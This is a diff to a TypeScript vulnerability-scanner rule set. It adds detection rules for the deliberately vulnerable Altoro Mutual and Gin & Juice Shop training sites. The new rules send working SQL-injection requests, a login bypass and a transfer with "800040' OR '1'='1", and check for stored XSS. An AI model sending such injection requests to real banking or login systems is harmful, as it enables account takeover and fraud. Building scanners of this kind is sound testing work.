@@ -50965,6 +50965,30 @@ const ginAndJuiceChangeEmailRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const ginAndJuiceChangePasswordRouteLiveOracle: Rule = async (ctx) => {
+  if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/my-account\/change-password\b/i.test(pageUrl)) return NEGATIVE;
+  const doc = await ctx.probe.get(pageUrl, { maxBytes: 32768, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasAccountNav =
+    /account-icon\s+selected/i.test(doc.body) && /href="\/my-account"/i.test(doc.body);
+  const hasLoginSurface =
+    /class=login-form/i.test(doc.body) &&
+    /name="username"/i.test(doc.body) &&
+    /type=username/i.test(doc.body);
+  if (!hasAccountNav || !hasLoginSurface) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: doc.body.match(/class=login-form[\s\S]{0,200}/i)?.[0]?.slice(0, 180),
+      note: "Gin & Juice Shop /my-account/change-password route scan — authenticated password-change surface gated behind login (PortSwigger account-takeover training lab entry point)"
+    }
+  };
+};
+
 // --- Escape API Security Academy (escape.tech/academy) ------------------------------
 const CLIENT_ESCAPE_ACADEMY_RES: { label: string; re: RegExp }[] = [
   {
@@ -60466,6 +60490,130 @@ const testfireLoginSqliRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function testfireSessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
+  return (
+    doc.setCookies.find((c) => /^AltoroAccounts=/i.test(c))?.split(";")[0] ??
+    doc.setCookies.find((c) => /AltoroAccounts/i.test(c))?.split(";")[0] ??
+    null
+  );
+}
+
+async function testfireLoginSessionCookie(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/doLogin", ctx.origin).toString();
+  const sqliBody = new URLSearchParams({
+    uid: TESTFIRE_SQLI_LOGIN_PAYLOAD,
+    passw: "x",
+    btnSubmit: "Login"
+  }).toString();
+  const sqliDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: sqliBody,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 512,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const sqliLoc = sqliDoc.headers.location || "";
+  if (![301, 302, 303, 307, 308].includes(sqliDoc.status)) return null;
+  if (!/\/bank\/main\.jsp/i.test(sqliLoc)) return null;
+  return testfireSessionCookieFromDoc(sqliDoc);
+}
+
+const testfireTransferSqliLiveOracle: Rule = async (ctx) => {
+  if (!isTestfireHost(ctx)) return NEGATIVE;
+  const cookie = await testfireLoginSessionCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  const transferUrl = new URL("/bank/doTransfer", ctx.origin).toString();
+  const badBody = new URLSearchParams({
+    fromAccount: "800039",
+    transferAmount: "1",
+    toAccount: "800040' OR '1'='1",
+    transfer: "Transfer"
+  }).toString();
+  const badDoc = await ctx.probe.get(transferUrl, {
+    method: "POST",
+    body: badBody,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (badDoc.status !== 500) return NEGATIVE;
+  if (!/NumberFormatException|For input string/i.test(badDoc.body)) return NEGATIVE;
+  if (!/800040' OR '1'='1/i.test(badDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: transferUrl,
+      payload: "800040' OR '1'='1",
+      status: badDoc.status,
+      snippet: badDoc.body.match(/For input string:[^<]{0,80}/i)?.[0]?.slice(0, 100),
+      note: "Altoro Mutual POST /bank/doTransfer with toAccount=800040' OR '1'='1 returns HTTP 500 NumberFormatException exposing injected account value — transfer SQLi/error-disclosure oracle"
+    }
+  };
+};
+
+const testfireTransferSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTestfireHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/bank\/transfer\.jsp/i.test(pageUrl)) return NEGATIVE;
+  const result = await testfireTransferSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Altoro Mutual /bank/transfer.jsp route scan — POST /bank/doTransfer SQLi payload triggers NumberFormatException — transfer injection oracle"
+    }
+  };
+};
+
+const testfireTransferStoredXssLiveOracle: Rule = async (ctx) => {
+  if (!isTestfireHost(ctx)) return NEGATIVE;
+  const cookie = await testfireLoginSessionCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  const transferUrl = new URL("/bank/transfer.jsp", ctx.origin).toString();
+  const doc = await ctx.probe.get(transferUrl, {
+    maxBytes: 32768,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const optionScript = doc.body.match(/<option[^>]*>[^<]*<script[^>]*>[\s\S]{0,120}?<\/script>/i);
+  if (!optionScript) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: transferUrl,
+      snippet: optionScript[0].slice(0, 160),
+      note: "Altoro Mutual /bank/transfer.jsp renders stored XSS in account <option> labels after login — transfer stored XSS oracle"
+    }
+  };
+};
+
+const testfireTransferStoredXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isTestfireHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/bank\/transfer\.jsp/i.test(pageUrl)) return NEGATIVE;
+  const result = await testfireTransferStoredXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Altoro Mutual /bank/transfer.jsp route scan — stored XSS in account dropdown option labels — transfer stored XSS oracle"
+    }
+  };
+};
+
 function isEuriSecCspHost(ctx: RuleContext): boolean {
   return /euri-sec-csp/i.test(ctx.origin) || /content security policy demo/i.test(ctx.combined);
 }
@@ -64458,6 +64606,10 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsPhotoDisclosureByEmailRouteLiveOracle,
   testfireLoginSqliLiveOracle,
   testfireLoginSqliRouteLiveOracle,
+  testfireTransferSqliLiveOracle,
+  testfireTransferSqliRouteLiveOracle,
+  testfireTransferStoredXssLiveOracle,
+  testfireTransferStoredXssRouteLiveOracle,
   euriSecCspDynamicScriptLiveOracle,
   euriSecCspDynamicScriptRouteLiveOracle,
   brokencrystalsSecretsLiveOracle,
@@ -65130,6 +65282,7 @@ export const RULES: Record<string, Rule> = {
   ginAndJuiceCatalogSubscribeRouteLiveOracle,
   ginAndJuiceCatalogProductRouteLiveOracle,
   ginAndJuiceChangeEmailRouteLiveOracle,
+  ginAndJuiceChangePasswordRouteLiveOracle,
   istEduSearchXssRouteLiveOracle,
   istEduNoticesLfiRouteLiveOracle,
   istEduPortalSqliRouteLiveOracle,
